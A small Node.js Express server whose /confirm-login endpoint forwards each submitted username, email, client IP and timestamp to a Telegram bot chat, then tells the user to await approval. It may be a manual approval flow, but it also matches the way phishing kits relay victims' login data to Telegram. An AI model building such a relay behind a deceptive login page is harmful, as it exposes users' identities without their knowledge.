require("dotenv").config();
const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.post("/confirm-login", async (req, res) => {
    const { username, email } = req.body;

    const message = `
🔐 Login Confirmation
👤 Username: ${username}
📧 Email: ${email}
🌍 IP: ${req.ip}
🕒 ${new Date().toLocaleString()}
    `;

    try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: process.env.CHAT_ID,
                text: message
            })
        });

        res.json({ message: "Confirmation sent. Await approval." });
    } catch {
        res.status(500).json({ message: "Failed to send confirmation." });
    }
});

app.listen(3000, () => {
    console.log("Server running at http://localhost:3000");
});
